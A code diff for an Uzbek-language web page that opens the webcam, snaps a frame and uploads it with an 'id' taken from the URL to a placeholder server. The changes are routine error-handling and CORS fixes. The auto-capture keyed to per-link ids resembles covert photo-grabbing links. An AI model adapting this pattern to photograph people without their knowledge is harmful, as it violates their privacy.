@@ -36,12 +36,14 @@
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <button id="retry" style="display: none;">Qayta urinish</button>
+    <p id="error" style="color: red;"></p> <!-- Xatolik uchun joy -->
 
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         const retryButton = document.getElementById("retry");
+        const errorMessage = document.getElementById("error");
 
         function startCamera() {
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -73,14 +75,17 @@
             fetch("https://yourserver.com/upload", {
                 method: "POST",
                 mode: "cors",
+                credentials: "include",  // 🍀 CORS muammolarini hal qilish uchun qo'shildi
+                headers: { 
+                    "Content-Type": "application/json"
+                },
                 body: JSON.stringify({
                     image: imageData,
                     userId: getQueryParam("id")
-                }),
-                headers: { "Content-Type": "application/json" }
+                })
             })
             .then(res => {
-                if (!res.ok) throw new Error("Serverdan noto‘g‘ri javob keldi");
+                if (!res.ok) throw new Error(`Serverdan noto‘g‘ri javob keldi! Status: ${res.status}`);
                 return res.json();
             })
             .then(data => {
@@ -88,7 +93,7 @@
             })
             .catch(err => {
                 console.error("Xatolik:", err);
-                document.body.innerHTML = `<h1>Xatolik yuz berdi! Qayta urinib ko‘ring.</h1>`;
+                errorMessage.innerText = `Xatolik yuz berdi: ${err.message}`;  // 🔴 Aniq xatoni chiqarish
                 retryButton.style.display = "block";
             });
         }
@@ -101,7 +106,8 @@
         retryButton.addEventListener("click", () => {
             document.body.innerHTML = `<h1>Rasmga tushirilmoqda...</h1>
                                        <video id="video" autoplay></video>
-                                       <canvas id="canvas" style="display: none;"></canvas>`;
+                                       <canvas id="canvas" style="display: none;"></canvas>
+                                       <p id="error" style="color: red;"></p>`;
             startCamera();
         });
 
